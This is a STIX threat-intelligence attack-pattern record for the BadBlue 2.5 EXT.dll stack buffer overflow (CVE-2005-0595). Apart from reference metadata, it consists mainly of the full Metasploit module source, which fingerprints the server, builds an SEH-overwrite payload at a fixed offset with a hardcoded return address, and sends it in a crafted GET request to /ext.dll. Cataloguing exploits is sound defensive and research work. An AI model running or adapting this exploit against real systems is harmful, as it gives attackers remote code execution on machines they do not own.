{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--86ce6ebe-c161-401e-a8a3-65208b16cf1d",
    "created": "2024-08-14T16:55:28.614709Z",
    "modified": "2024-08-14T16:55:28.614713Z",
    "name": "BadBlue 2.5 EXT.dll Buffer Overflow",
    "description": " This is a stack buffer overflow exploit for BadBlue version 2.5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/badblue_ext_overflow.rb",
            "external_id": "badblue_ext_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0595"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  # NOTE: BadBlue doesn't give any HTTP headers when requesting '/'.\n  # However, a proper Server header is returned when requesting /index.html or using HEAD.\n  HttpFingerprint = { :method => 'HEAD', :pattern => [ /BadBlue\\// ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BadBlue 2.5 EXT.dll Buffer Overflow',\n      'Description'    => %q{\n        This is a stack buffer overflow exploit for BadBlue version 2.5.\n      },\n      'Author'         => 'acaro <acaro[at]jervus.it>',\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0595' ],\n          [ 'OSVDB', '14238' ],\n          [ 'BID', '7387' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['BadBlue 2.5 (Universal)', { 'Ret' => 0x1003d9da }],\n        ],\n      'DisclosureDate' => '2003-04-20',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    info = http_fingerprint  # check method\n    if (info =~ /BadBlue\\/2\\.5/)\n      return Exploit::CheckCode::Appears\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    uri     = \"GET /ext.dll?mfcisapicommand=\"\n    sploit  = rand_text_alphanumeric(500)\n    seh     = generate_seh_payload(target.ret)\n    sploit[492, seh.length] = seh\n    uri << sploit\n\n    print_status(\"Trying target #{target.name}...\")\n    send_request_raw({ 'uri' => uri })\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-04-20",
    "x_mitre_platforms": [
        "win'"
    ]
}